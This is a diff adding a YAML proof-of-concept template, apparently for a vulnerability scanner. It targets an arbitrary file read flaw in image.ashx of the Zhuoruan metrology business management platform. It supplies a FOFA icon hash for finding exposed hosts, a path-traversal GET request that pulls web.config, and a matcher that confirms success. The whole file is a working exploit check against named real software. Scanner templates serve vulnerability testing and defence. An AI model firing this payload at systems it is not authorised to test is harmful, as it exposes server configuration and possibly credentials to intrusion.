@@ -1,0 +1,15 @@
+id: poc-yaml-zhuo-ruan-mbmp-image-ashx-anyfile-read
+info:
+  name: 卓软计量业务管理平台 image.ashx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 卓软计量业务管理平台
+  fofa: icon_hash="-334571363"
+requests:
+- method: GET
+  path: /HuameiMeasure/image.ashx?image_path=./../web.config
+  expression: status_code == 200 && contains(body,"<configuration>") && contains(body,"<system.Web>")
+    && contains(body,"web.config") && contains(content_type,"image/Jpeg")
+variables: {}
+transport: http
